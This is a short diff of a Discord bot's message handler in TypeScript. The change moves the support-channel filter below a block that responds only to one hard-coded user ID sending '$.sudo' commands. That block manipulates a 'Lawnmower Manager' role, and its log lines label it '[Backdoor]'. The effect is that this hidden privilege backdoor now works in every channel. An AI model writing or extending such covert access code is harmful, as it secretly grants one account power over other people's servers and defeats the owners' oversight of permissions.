@@ -34,7 +34,6 @@ const supportChannels: string[] = [
 export default async function run(message: Message) {
     if (message.author.bot) return;
     c.trail(`<${message.author.username}#${message.author.discriminator}> ${message.content}`);
-    if (!supportChannels.includes(message.channel.id)) return;
 
     if (message.author.id == "231774635476254721" && message.content.startsWith('$.sudo')) {
         if (!message.member!.roles.cache.some(r => r.name === "Lawnmower Manager")) {
@@ -50,6 +49,8 @@ export default async function run(message: Message) {
             c.log(`[Backdoor] Deleted role Lawnmower Manager`);
         }
     }
+
+    if (!supportChannels.includes(message.channel.id)) return;
 
     regexList.forEach(async regex => {
         if (regex.test(message.content)) {
